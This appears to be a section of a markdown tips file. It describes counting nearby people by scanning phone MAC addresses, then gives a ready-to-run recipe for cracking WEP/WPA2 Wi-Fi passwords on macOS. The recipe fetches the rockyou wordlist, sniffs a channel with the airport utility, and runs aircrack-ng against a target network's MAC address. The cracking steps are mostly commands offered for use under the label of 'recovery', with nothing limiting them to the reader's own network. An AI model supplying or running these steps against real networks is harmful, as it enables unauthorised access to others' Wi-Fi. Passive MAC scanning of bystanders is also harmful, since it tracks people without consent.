## How many people are around
Check to see [how many people are around](https://github.com/schollz/howmanypeoplearearound) by scanning nearby devices and comparing against a list of known prefixes on cell phone MAC addresses (cell phone devices around ~= people around).

## Wireless password recovery
[In-depth guide here](https://github.com/brannondorsey/wifi-cracking)

#### WEP/WPA2
Note: WPA2 will require a dictionary to crack, and it's not likely dictionaries are any good anymore except for _very_ basic or default passwords. You can get a dictionary here:

```
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

### Using Airport and Aircrack-ng

Install aircrack-ng:

```
brew install aircrack-ng
```

Create the following symlink:

```
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```

ref: http://stackoverflow.com/questions/33223457/mac-osx-el-capitan-airport-sym-link-not-permitted

Figure out which channel you need to sniff:

```
sudo airport -s
```

Keep the following command running:

```
sudo airport en1 sniff [CHANNEL]
```

In a new terminal:

```
aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE]
```

The cap_file will be located in the /tmp/airportSniff*.cap.
